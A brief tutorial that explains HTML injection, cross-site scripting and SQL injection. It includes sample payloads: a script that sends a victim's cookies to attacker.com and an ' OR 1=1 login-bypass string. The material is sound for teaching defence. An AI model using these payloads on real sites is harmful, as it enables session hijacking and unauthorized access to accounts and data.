Understanding Web Injections

Web injection attacks involve attackers inserting malicious code or data into an application, which is then processed by the server or displayed to other users. These vulnerabilities can lead to data breaches, unauthorized access, and defacement of websites.

1. HTML Injection

What it is: Occurs when an application takes user input and renders it directly into the HTML page without proper sanitization. An attacker can insert arbitrary HTML tags, altering the page's structure or content.

Example: If a comment section doesn't filter input, an attacker could post <h1>Malicious Heading</h1>, which would appear as a large heading on the page.

2. Cross-Site Scripting (XSS)

What it is: A type of injection where malicious scripts are injected into otherwise trusted websites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser-side script, to a different end-user.

Types: Reflected XSS, Stored XSS, DOM-based XSS.

Example: An attacker might inject <script>alert('You are hacked!');</script> or even scripts to steal cookies: <script>document.location='http://attacker.com/steal?c='+document.cookie;</script>.

3. SQL Injection

What it is: A code injection technique used to attack data-driven applications, in which malicious SQL statements are inserted into an entry field for execution (e.g., to dump database contents to the attacker).

Example: In a login form, entering ' OR 1=1; -- as a username can bypass authentication by making the SQL query always true. For example: SELECT * FROM users WHERE username = '' OR 1=1; --' AND password = '...'
